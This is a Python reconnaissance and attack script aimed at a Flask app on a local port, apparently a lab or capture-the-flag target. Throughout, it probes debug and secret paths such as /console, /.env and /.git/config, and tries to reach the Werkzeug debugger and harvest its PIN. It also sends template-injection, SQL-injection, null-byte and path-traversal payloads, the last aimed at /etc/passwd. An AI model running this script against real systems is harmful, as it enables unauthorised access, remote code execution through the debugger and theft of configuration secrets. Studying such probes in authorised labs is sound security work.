import requests
import re
import json
import time
from urllib.parse import urljoin

base_url = "http://127.0.0.1:33160"
results = {
    "debug_endpoints": {},
    "flask_indicators": [],
    "routes_found": [],
    "debug_pin": None,
    "version_info": {},
    "errors_triggered": {},
    "server_reachable": False
}

print("="*60)
print("Flask Application Introspection Scan")
print(f"Target: {base_url}")
print("="*60)

# First check if server is reachable
print("\n[0] Testing Server Connectivity:")
print("-" * 60)
try:
    response = requests.get(base_url, timeout=10)
    results["server_reachable"] = True
    print(f"[+] Server is reachable - Status: {response.status_code}")
    print(f"[+] Response size: {len(response.content)}B")
    
    # Check for Flask session cookie
    set_cookie = response.headers.get('Set-Cookie', '')
    if 'session' in set_cookie.lower():
        session_match = re.search(r'session=([^;]+)', set_cookie, re.IGNORECASE)
        if session_match:
            print(f"[+] Flask session detected: {session_match.group(1)[:40]}...")
            results["flask_indicators"].append(f"Session: {session_match.group(1)[:20]}...")
    
except requests.exceptions.ConnectionError:
    print(f"[-] Connection Error: Cannot reach {base_url}")
    print("[-] Server may be down or refusing connections")
    results["server_reachable"] = False
except requests.exceptions.Timeout:
    print(f"[-] Timeout: Server didn't respond in time")
    results["server_reachable"] = False
except Exception as e:
    print(f"[-] Error: {str(e)}")
    results["server_reachable"] = False

if not results["server_reachable"]:
    print("\n[!] Cannot proceed - target is unreachable")
    exit()

# Common Flask/Werkzeug debug endpoints to test
debug_endpoints = [
    "/console",
    "/__debug__",
    "/__debug__/console",
    "/debugger",
    "/debug",
    "/admin",
    "/flask",
    "/routes",
    "/env",
    "/config",
    "/.env",
    "/.git/config"
]

print("\n[1] Testing Flask/Werkzeug Debug Endpoints:")
print("-" * 60)
for endpoint in debug_endpoints:
    url = urljoin(base_url, endpoint)
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        results["debug_endpoints"][endpoint] = {
            "status": response.status_code,
            "length": len(response.content),
            "has_debugger": "Werkzeug Debugger" in response.text or "__debugger__" in response.text,
            "has_console": "console" in response.text.lower() and ("pin" in response.text.lower() or "debugger" in response.text.lower()),
            "location": response.headers.get('Location', '') if response.status_code in [301, 302, 303, 307, 308] else None
        }
        
        status_display = f"{response.status_code:3d}"
        if response.status_code in [301, 302, 303, 307, 308]:
            status_display = f"{response.status_code}->{response.headers.get('Location', 'unknown')}"
        
        print(f"[*] {endpoint:40s} Status: {status_display:15s} | Size: {len(response.content):5d}B")
        
        if response.status_code == 200:
            print(f"  [+] 200 OK - Content-Type: {response.headers.get('Content-Type', 'unknown')}")
        elif response.status_code == 500:
            print(f"  [!] 500 Error - Debugger might be triggered")
        
        # Check for debug pin
        pin_match = re.search(r'PIN[:\s]+([0-9-]+)', response.text)
        if pin_match:
            results["debug_pin"] = pin_match.group(1)
            print(f"  [!!!] DEBUG PIN FOUND: {pin_match.group(1)}")
        
        # Check for route leaks
        route_patterns = [
            r'Route\([^)]*\)',
            r'<Rule [^>]*>',
            r'@app\.route\([^)]*\)'
        ]
        
        for pattern in route_patterns:
            matches = re.findall(pattern, response.text)
            if matches:
                print(f"  [+] Routes found: {matches[:3]}")
                results["routes_found"].extend(matches)
                
    except requests.exceptions.Timeout:
        print(f"[-] {endpoint:40s} Timeout")
        results["debug_endpoints"][endpoint] = {"error": "timeout"}
    except Exception as e:
        print(f"[-] {endpoint:40s} Error: {str(e)[:40]}")
        results["debug_endpoints"][endpoint] = {"error": str(e)[:40]}
    
    time.sleep(0.1)  # Small delay between requests

# Analyze headers for Flask version info
print("\n[2] Analyzing Response Headers:")
print("-" * 60)
try:
    response = requests.get(base_url, timeout=5)
    headers = dict(response.headers)
    
    print("[+] Response Headers:")
    for header_name, header_value in headers.items():
        print(f"  - {header_name}: {header_value}")
        
        header_lower = header_value.lower()
        if any(indicator in header_lower for indicator in ['werkzeug', 'flask', 'python', 'wsgi']):
            results["flask_indicators"].append(f"{header_name}: {header_value}")
    
    # Extract version info
    server_header = headers.get('Server', '')
    if server_header:
        results["version_info"]['server'] = server_header
        
    x_powered_by = headers.get('X-Powered-By', '')
    if x_powered_by:
        results["version_info"]['x_powered_by'] = x_powered_by
        
    x_generated_by = headers.get('X-Generated-By', '')
    if x_generated_by:
        results["version_info"]['x_generated_by'] = x_generated_by
        
except Exception as e:
    print(f"[-] Error analyzing headers: {str(e)}")

# Try to trigger debugger console
print("\n[3] Testing Debugger Console Access:")
print("-" * 60)
debugger_tests = [
    "/?__debugger__=yes&cmd=resource&f=console.html",
    "/?__debugger__=yes&cmd=resource&f=debugger.js",
    "/?__debugger__=yes&cmd=resource&f=style.css",
    "/__debug__/?cmd=resource&f=console.html"
]

for test_url in debugger_tests:
    url = urljoin(base_url, test_url)
    try:
        response = requests.get(url, timeout=5)
        
        if "Werkzeug Debugger" in response.text or "__debugger__" in response.text:
            print(f"[!!!] Debugger interface found at: {test_url}")
            
            # Look for available commands
            cmd_matches = re.findall(r'cmd=([^&\'\"\s]+)', response.text)
            if cmd_matches:
                unique_cmds = list(set(cmd_matches))
                print(f"  [+] Available commands: {unique_cmds}")
                
            # Check for PIN requirement
            if "PIN" in response.text or "pin" in response.text.lower():
                print(f"  [!] PIN required for access")
                
                pin_match = re.search(r'PIN[:\s]*([0-9-]+)', response.text)
                if pin_match:
                    results["debug_pin"] = pin_match.group(1)
                    print(f"  [!!!] PIN FOUND: {pin_match.group(1)}")
                    
        elif response.status_code == 200:
            print(f"[+] {test_url} returned 200 (size: {len(response.content)}B)")
        else:
            print(f"[-] {test_url} - Status: {response.status_code}")
            
    except Exception as e:
        print(f"[-] Error accessing {test_url}: {str(e)[:40]}")

# Test for route enumeration via errors
print("\n[4] Testing Error-Based Route Enumeration:")
print("-" * 60)
error_tests = [
    "/nonexistent_page_trigger_error_12345",
    "/{{ 7*7 }}",
    "/{{ config.__class__ }}",
    "/admin' OR '1'='1",
    "/..%2f..%2fetc%2fpasswd",
    "/%00"
]

for test_path in error_tests:
    url = urljoin(base_url, test_path)
    try:
        response = requests.get(url, timeout=5)
        
        # Look for route information in error pages
        content = response.text
        
        if "Traceback" in content or "File \"" in content:
            print(f"[!] Detailed traceback at: {test_path}")
            
            # Extract file paths (might reveal structure)
            file_matches = re.findall(r'File \"([^\"]+)\"', content)
            if file_matches:
                unique_files = list(set(file_matches))[:5]
                print(f"  [+] Source files: {unique_files}")
                
            # Look for route definitions
            route_matches = re.findall(r'@app\.route\(\"([^\"]+)\"[^\)]*\)', content)
            if route_matches:
                print(f"  [!!!] Route definitions found: {route_matches}")
                results["routes_found"].extend(route_matches)
                
        # Check for debugger
        if "__debugger__" in content:
            print(f"  [!] Debugger active on error page")
            
    except Exception as e:
        print(f"[-] Error with {test_path}: {str(e)[:40]}")

# Summary
print("\n" + "="*60)
print("INTROSPECTION SUMMARY")
print("="*60)
print(f"[+] Server reachable: {results['server_reachable']}")
print(f"[+] Debug endpoints tested: {len(debug_endpoints)}")
print(f"[+] Debugger tests performed: {len(debugger_tests)}")

if results["debug_pin"]:
    print(f"\n[!!!] CRITICAL FINDING: Debug PIN discovered: {results['debug_pin']}")
else:
    print(f"\n[-] No debug PIN found")

if results["flask_indicators"]:
    print(f"\n[+] Flask indicators: {len(results['flask_indicators'])}")
    for indicator in results["flask_indicators"][:5]:
        print(f"  - {indicator}")
else:
    print(f"\n[-] No Flask indicators detected")

if results["routes_found"]:
    unique_routes = list(set(results["routes_found"]))
    print(f"\n[+] Routes discovered: {len(unique_routes)}")
    for route in unique_routes[:10]:
        print(f"  - {route}")
else:
    print(f"\n[-] No routes discovered")

# Show successful debug endpoints
successful_endpoints = {k:v for k,v in results["debug_endpoints"].items() if isinstance(v, dict) and v.get('status') == 200}
if successful_endpoints:
    print(f"\n[+] Successful endpoints (200 OK):")
    for endpoint, data in list(successful_endpoints.items())[:5]:
        print(f"  - {endpoint} (size: {data.get('length', 0)}B)")

# Print JSON results
print("\n" + "="*60)
print("DETAILED RESULTS (JSON)")
print("="*60)
print(json.dumps(results, indent=2))
